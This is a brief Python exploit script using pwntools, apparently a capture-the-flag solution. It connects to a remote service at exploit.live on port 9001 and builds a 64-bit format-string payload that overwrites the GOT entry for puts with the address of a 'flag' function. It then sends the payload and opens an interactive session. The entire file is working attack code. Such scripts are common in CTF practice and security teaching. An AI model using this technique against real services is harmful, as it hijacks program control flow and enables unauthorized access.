from pwn import *
from fmtstr import FormatString
from hexdump import hexdump

e = ELF('pwnable')
#r = process("./pwnable")
r = remote('exploit.live', 9001)

fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got[b'puts']] = e.symbols[b'flag']
payload, sig = fmt.build()

hexdump(payload)
log.info(payload)
r.sendline(payload)
r.interactive()
